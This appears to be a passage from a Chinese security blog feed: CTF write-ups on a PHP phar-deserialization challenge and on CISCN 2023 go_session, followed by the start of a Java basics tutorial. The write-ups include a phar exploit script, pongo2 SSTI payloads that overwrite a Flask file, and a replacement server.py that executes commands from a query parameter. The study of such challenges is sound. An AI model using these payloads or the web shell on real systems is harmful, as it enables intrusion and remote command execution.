class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">    <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">detele</span>();</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">true</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">false</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;File not exist&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>download.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="title function_ invoke__">getcwd</span>() . <span class="string">&quot;:/etc:/tmp&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>) &amp;&amp; <span class="title function_ invoke__">stristr</span>(<span class="variable">$filename</span>, <span class="string">&quot;flag&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/octet-stream&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-Disposition: attachment; filename=&quot;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File not exist&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里有delete.php来触发file_exists然后触发反序列化,</p><p> 原因是在download中设置了open_basedir</p><blockquote><p><code>open_basedir</code> 是 PHP 的一个安全特性，用于限制 PHP 脚本对文件系统的访问范围。当 <code>open_basedir</code> 配置设置为某个目录时，PHP 脚本只能访问该目录及其子目录中的文件，而不能访问其他目录中的文件。</p></blockquote><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">        <span class="variable">$file</span>-&gt;filename = <span class="string">&quot;/flag.txt&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = <span class="keyword">array</span>(<span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;db = <span class="keyword">new</span> <span class="title class_">FileList</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;test.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF86a&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240315155224020.png" alt="image-20240315155224020"></p><h2 id="CISCN-2023-初赛-go-session"><a href="#CISCN-2023-初赛-go-session" class="headerlink" title="[CISCN 2023 初赛]go_session"></a>[CISCN 2023 初赛]go_session</h2><p>第一次做go审计,先看源码</p><p>main.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;main/route&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">r.GET(<span class="string">&quot;/&quot;</span>, route.Index)</span><br><span class="line">r.GET(<span class="string">&quot;/admin&quot;</span>, route.Admin)</span><br><span class="line">r.GET(<span class="string">&quot;/flask&quot;</span>, route.Flask)</span><br><span class="line">r.Run(<span class="string">&quot;0.0.0.0:80&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>route.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> route</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;github.com/flosch/pongo2/v6&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gorilla/sessions&quot;</span></span><br><span class="line"><span class="string">&quot;html&quot;</span></span><br><span class="line"><span class="string">&quot;io&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> store = sessions.NewCookieStore([]<span class="type">byte</span>(os.Getenv(<span class="string">&quot;SESSION_KEY&quot;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Index</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line">session.Values[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;guest&quot;</span></span><br><span class="line">err = session.Save(c.Request, c.Writer)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">c.String(<span class="number">200</span>, <span class="string">&quot;Hello, guest&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Admin</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] != <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">name := c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;ssti&quot;</span>)</span><br><span class="line">xssWaf := html.EscapeString(name)</span><br><span class="line">tpl, err := pongo2.FromString(<span class="string">&quot;Hello &quot;</span> + xssWaf + <span class="string">&quot;!&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">out, err := tpl.Execute(pongo2.Context&#123;<span class="string">&quot;c&quot;</span>: c&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.String(<span class="number">200</span>, out)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Flask</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">resp, err := http.Get(<span class="string">&quot;http://127.0.0.1:5000/&quot;</span> + c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;guest&quot;</span>))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line">body, _ := io.ReadAll(resp.Body)</span><br><span class="line"></span><br><span class="line">c.String(<span class="number">200</span>, <span class="type">string</span>(body))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>三条路由</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/ : 设置一个guest的客户端session</span><br><span class="line">/admin : 鉴权是否为admin, 若是, 接受一个name参数, 并使用 Pongo2 模板引擎渲染参数值</span><br><span class="line">/flask : 访问内网的flask服务</span><br></pre></td></tr></table></figure><p>看了题解, 这里的os.Getenv(“SESSION_KEY”), </p><p>SESSION_KEY环境变量并没有设置, 导致可以伪造session</p><p>本地搭建了go环境, 直接把源码修改一下在本地运行, 让他返回一个admin的session</p><p>修改index路由, 返回admin的session而不是guest的</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line">session.Values[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;admin&quot;</span> <span class="comment">/////////修改为admin</span></span><br><span class="line">err = session.Save(c.Request, c.Writer)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240314215648315.png" alt="image-20240314215648315"></p><p>拿这这个session去&#x2F;admin路由鉴权</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240314220545328.png" alt="image-20240314220545328"></p><p>可以看见模板字符串被渲染了, 存在ssti</p><p>再看后端flask</p><p>不传规定的参数name, 随便穿个参数让他报错出源码</p><p>GET &#x2F;flask?name&#x3D;?a&#x3D;1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name = request.args[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> name + <span class="string">&quot; no ssti&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__== <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">5000</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>开启了debug, 也就意味着改变源码后服务器会立即更新, </p><p>这里就用到了SaveUploadedFile方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;c.SaveUploadedFile(c.FormFile(&quot;file&quot;),&quot;/app/server.py&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>c.FormFile(“file”)返回表单数据中name为file的文件, SaveUploadedFile将该文件保存到”&#x2F;app&#x2F;server.py”</p><p>但是这里有一步html特殊字符的转义</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">html.EscapeString(name)</span><br></pre></td></tr></table></figure><p>所以payload中的引号会被转义掉</p><p>这里又引入了c.Request.Referer()或c.Request.UserAgent()方法, 顾名思义就是返回UA或者Referer的值(字符串)</p><p>还有一种方法是HandlerName() 方法，用于返回主处理程序的名称，这里返回的就是admin&#x2F;route.Admin，如何可以使用last过滤器获取最后一个字符n</p><p>两种payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;c.SaveUploadedFile(c.FormFile(c.Request.UserAgent()),c.Request.UserAgent())&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;c.SaveUploadedFile(c.FormFile(c.HandlerName()|last),c.Request.Referer())&#125;&#125;</span><br></pre></td></tr></table></figure><p>准备一个要替换上去的server.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    cmd = request.args[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">    file=os.popen(cmd).read()</span><br><span class="line">    <span class="keyword">return</span> file</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>方便起见, 最直接用ApiPost7设置好http headers和请求参数, 上传的文件</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240315001841245.png" alt="image-20240315001841245"></p><p>之后访问flask,得到flag</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240315002025364.png" alt="image-20240315002025364"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://exp10it.io/2023/05/2023-ciscn-%E5%88%9D%E8%B5%9B-web-writeup/#go_session">https://exp10it.io/2023/05/2023-ciscn-%E5%88%9D%E8%B5%9B-web-writeup/#go_session</a></p><p><a href="https://blog.csdn.net/qq_62068476/article/details/132292872">https://blog.csdn.net/qq_62068476/article/details/132292872</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java安全基础</title>
      <link href="/2024/03/08/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
      <url>/2024/03/08/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="Java基础语法"><a href="#Java基础语法" class="headerlink" title="Java基础语法"></a>Java基础语法</h1><h2 id="SOUT和SOUF输出"><a href="#SOUT和SOUF输出" class="headerlink" title="SOUT和SOUF输出"></a>SOUT和SOUF输出</h2><h3 id="SOUT"><a href="#SOUT" class="headerlink" title="SOUT"></a>SOUT</h3><p>不能使用格式化字符串, 但可以使用<code>+</code>拼接</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">System.out.print(<span class="string">&quot;hello,&quot;</span> + <span class="string">&quot;world!&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;hello,&quot;</span> + <span class="string">&quot;world!&quot;</span>); <span class="comment">// 末尾自动补一个换行符</span></span><br></pre></td></tr></table></figure><h3 id="SOUF"><a href="#SOUF" class="headerlink" title="SOUF"></a>SOUF</h3><p>可以使用格式化字符串</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">System.out.printf(<span class="string">&quot;hello,&quot;</span> + <span class="string">&quot;world and %s!&quot;</span>, <span class="string">&quot;you&quot;</span>);</span><br><span class="line"><span class="comment">//hello,world and you!</span></span><br></pre></td></tr></table></figure><h2 id="Scanner输入"><a href="#Scanner输入" class="headerlink" title="Scanner输入"></a>Scanner输入</h2><p><strong>两种输入方式<code>next()，nextline()</code></strong></p><h3 id="next"><a href="#next" class="headerlink" title="next()"></a>next()</h3><p>以空格为结束符</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n4c1.www;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;Please input:&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(input.hasNext()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> input.next();</span><br><span class="line">            System.out.printf(<span class="string">&quot;hello %s&quot;</span>, str);</span><br><span class="line">        &#125;</span><br><span class="line">        input.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240308204606772.png" alt="image-20240308204606772"></p><h3 id="nextline"><a href="#nextline" class="headerlink" title="nextline()"></a>nextline()</h3><p>以回车为结束符</p><h2 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h2><p>与C语言完全相同</p><h2 id="增强for循环"><a href="#增强for循环" class="headerlink" title="增强for循环"></a>增强for循环</h2><p>自动遍历数组</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] numbers = &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i : numbers) &#123;</span><br><span class="line">            System.out.println(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="类与继承"><a href="#类与继承" class="headerlink" title="类与继承"></a>类与继承</h2><p><strong>小知识</strong></p><blockquote><ul><li><strong>Public类：</strong> 一个Java文件中只能有一个<code>public</code>类，并且这个<code>public</code>类的名称必须与文件名相同。这样的类可以从其他包中访问。</li><li><strong>非public类：</strong> 一个Java文件可以包含多个非public类，它们的访问级别被限制在同一包中。这些类不能被其他包中的类直接访问。</li></ul></blockquote><p>Person.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n4c1.www;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span>&#123;</span><br><span 